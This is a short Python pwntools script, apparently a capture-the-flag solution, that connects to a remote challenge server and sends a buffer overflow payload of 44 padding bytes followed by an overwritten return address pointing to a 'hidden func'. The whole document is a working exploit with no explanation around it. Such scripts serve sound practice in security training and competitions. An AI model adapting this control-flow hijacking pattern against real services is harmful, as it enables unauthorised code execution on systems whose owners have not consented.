from pwn import *

p = remote('chal.tuctf.com',30011)

print(p.clean())

payload = b'A' * 44 + p64(0xdeadbeef) # offset + location of hidden func

p.sendline(payload)

print(p.recvall())

